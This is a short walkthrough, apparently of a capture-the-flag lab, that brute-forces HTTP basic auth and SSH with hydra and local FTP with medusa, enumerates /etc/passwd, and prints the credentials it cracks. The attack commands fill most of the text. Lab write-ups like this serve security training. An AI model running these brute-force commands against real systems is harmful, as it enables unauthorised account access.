# Part 1

We are presented with a basic auth login prompt when visiting the provided address.
Let's try and brute force:

```
hydra -L usernames.txt -P passwords.txt -s 50938 94.237.121.111 http-get
```

We cracked it with credentials `admin:Admin123`
We are told when logging in that the user we need for the next challenge is `satwossh`

# Part 2

First attack the ssh server:
```
hydra -l satwossh -P passwords.txt -s 58366 ssh://94.237.122.95
```
We successfully found the password: `password1`

then login to the ssh server
```
ssh -p 58366 satwossh@94.237.122.95
```

There is a file which mentions the name `thomas`, also the `/etc/passwd` file contain a user `thomas`
Let's try to brute force his password:
```
medusa -h 127.0.0.1 -u thomas -P 2020-200_most_used_passwords.txt -M ftp -t 5
```
We find the password `chocolate!`.
We can nog login to the ftp server:
```
ftp ftp://thomas:'chocolate!'@localhost
```
